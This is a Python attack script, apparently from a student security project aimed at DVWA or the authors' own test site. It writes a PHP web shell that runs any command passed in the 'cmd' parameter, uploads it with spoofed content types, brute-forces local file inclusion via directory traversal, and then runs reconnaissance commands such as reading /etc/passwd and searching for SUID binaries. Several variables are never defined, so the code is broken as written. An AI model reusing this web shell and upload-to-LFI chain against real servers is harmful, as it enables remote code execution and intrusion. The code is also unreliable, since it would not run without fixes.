#!/usr/bin/env python3

from argparse import ArgumentParser
from sys import exit
import requests
from bs4 import BeautifulSoup
import urllib.parse
import crawler
import lfi
import upload

# Target Configuration (own website)
URL = "http://ict2214p1b2.mooo.com/"
COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"} # change this to your own cookie

# Target Configuration (DVWA)
# URL = "http://127.0.0.1/DVWA/"
# COOKIE = {
#     "PHPSESSID": "7od1c1i037769jfj92p5vscr4k", # change this to your own cookie
#     "security": "medium",
# }

WORDLIST = "wordlists/test"
CONTENT_TYPE_WORDLIST = "wordlists/content_type_big.txt"  # wordlists/content_type_small.txt OR wordlists/content_type_big.txt
UPLOAD_DIR_WORDLIST = "wordlists/upload_dir_wordlist_small.txt"  # wordlists/upload_dir_wordlist_small.txt OR wordlists/upload_dir_wordlist_big.txt

REPORT_FILENAME = "vuln_report.txt"
CONTENT_TYPE = ['application/x-php','image/jpeg','image/png']

def create_payload():
    payload_content = """<?php
    echo "<h3 style='color: green;'>[+] Malicious file uploaded successfully!</h3>";
    
    if(isset($_GET['cmd'])) {
        $commands = explode(';', $_GET['cmd']);
        foreach($commands as $command) {
            $clean_cmd = htmlspecialchars(trim($command));
            echo "<h4>=== Command: {$clean_cmd} ===</h4>";
            echo "<pre>" . shell_exec($command) . "</pre>";
        }
    } else {
        echo "<p style='color: red;'>ERROR: Add ?cmd=command1;command2</p>";
    }
    ?>"""
    with open(PAYLOAD_FILENAME, 'w') as f:
        f.write(payload_content)
    print(f"[+] Payload file '{PAYLOAD_FILENAME}' created.")

def upload_file():
    for type in CONTENT_TYPE:
        data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
        files = {'uploaded': (PAYLOAD_FILENAME, open(PAYLOAD_FILENAME, 'rb'), type)}
        try:
            print(f"[*] Uploading file with {type}")
            response = requests.post(UPLOAD_URL, files=files, data=data, cookies=COOKIE)
            if "succesfully uploaded!" in response.text:
                print("[+] File uploaded successfully!")
                return True
            else:
                print("[-] Upload failed. Check your cookies and directory permissions.")
        except Exception as e:
            print(f"[-] Upload error: {str(e)}")
    return False

def brute_force_lfi(session):
    payload_relative = "hackable/uploads/" + PAYLOAD_FILENAME

    with open("lfi.txt", "r") as f:
        file_data = f.read()

    lfi_payloads = file_data.strip().split("\n")
    for payload in lfi_payloads:
        for depth in range(1, 10):
            traversal = payload * depth
            test_url = f"{LFI_VULN_URL}{traversal}{payload_relative}"
            print(f"[*] Trying LFI URL: {test_url}")
            response = session.get(test_url, cookies=COOKIE)
            if "[+] Malicious file uploaded successfully!" in response.text:
                print(f"[+] Successfully included payload: {test_url}")
                return test_url
    return None

# def brute_force_lfi(lfi_url_base, payload_relative, session, traversal_list):
#     """
#     Tries different directory traversal prefixes to include the uploaded file via the LFI page.
#     payload_relative is the relative path to the uploaded file (e.g. "hackable/uploads/malicious.php")
#     """
#     for traversal in traversal_list:
#         test_url = f"{lfi_url_base}{traversal}{payload_relative}"
#         print(f"[*] Trying LFI URL: {test_url}")
#         try:
#             r = session.get(test_url, cookies=COOKIE)
#             # Look for a marker from our payload
#             if "[+] Malicious file uploaded successfully!" in r.text:
#                 print(f"[+] Found malicious file via LFI at: {test_url}")
#                 return test_url
#         except Exception as e:
#             print(f"[-] Error testing {test_url}: {str(e)}")
#     return None

def trigger_payload_via_lfi(url):
    """
    Appends the command parameter to the LFI URL to trigger our uploaded payload.
    """
    commands = [
        "id",
        "uname -a",
        "grep 'x:1000:' /etc/passwd",
        "ls -lAh /home",
        "find /usr/bin /bin -perm -4000 2>/dev/null"
    ]
    cmd_string = ";".join(commands)
    separator = "&" if "?" in url else "?"
    full_url = f"{url}{separator}cmd={urllib.parse.quote(cmd_string)}"
    try:
        print(f"[*] Triggering payload via LFI at: {full_url}")
        response = requests.get(full_url, cookies=COOKIE)
        if response.status_code == 200:
            print("[+] Command results:")
            print(response.text)
            return response.text
        else:
            print(f"[-] Execution failed (HTTP {response.status_code})")
            return ""
    except Exception as e:
        print(f"[-] Trigger error: {str(e)}")
        return ""

def generate_report(uploaded_url, lfi_url, command_results):
    report = "Vulnerability Report\n"
    report += "====================\n"

    if uploaded_files:
        report += "\n✅ **Successfully Uploaded Files:**\n"
        for file in uploaded_files:
            report += f"- {file}\n"
    else:
        report += "\n❌ **No files were successfully uploaded.**\n"

    if failed_files:
        report += "\n🚫 **Failed Uploads:**\n"
        for file in failed_files:
            report += f"- {file}\n"

    if executed_files:
        report += "\n⚡ **Files Successfully Executed:**\n"
        for file in executed_files:
            report += f"- {file}\n"
    else:
        report += "\n⚠ **No files executed successfully.**\n"

    try:
        with open(REPORT_FILENAME, "w") as f:
            f.write(report)
        print(f"[+] Report generated successfully: {REPORT_FILENAME}")
    except Exception as e:
        print(f"[-] Error writing report file: {e}")



def main():
    session = requests.Session()
    
    # --- File Upload Phase ---
    create_payload()
    if not upload_file():
        print("[-] Aborting due to upload failure.")
        return
    # Direct URL to the uploaded file (if you can access it directly)
    direct_file_url = f"{UPLOAD_DIR}{PAYLOAD_FILENAME}"
    print(f"[+] Direct file URL (if accessible): {direct_file_url}")
    
    # # --- LFI Brute Force Phase ---
    # # List of common traversal prefixes
    # traversal_list = ["", "../", "../../", "../../../", "../../../../", "../../../../../"]
    # # The relative path (from DVWA root) to the uploaded file
    # payload_relative = "hackable/uploads/" + PAYLOAD_FILENAME
    # lfi_found_url = brute_force_lfi(LFI_VULN_URL, payload_relative, session, traversal_list)
    
    # # --- Trigger Payload Phase ---
    # if lfi_found_url:
    #     command_results = trigger_payload_via_lfi(lfi_found_url)
    # else:
    #     print("[-] Could not locate the uploaded file via LFI.")
    #     command_results = ""
    
    # --- LFI Brute Force and Trigger Payload Phase ---
    lfi_found_url = brute_force_lfi(session)
    if lfi_found_url:
        command_results = trigger_payload_via_lfi(lfi_found_url)
    else:
        command_results = ""

    # --- Report Generation ---
    generate_report(direct_file_url, lfi_found_url, command_results)


if __name__ == "__main__":
    main()
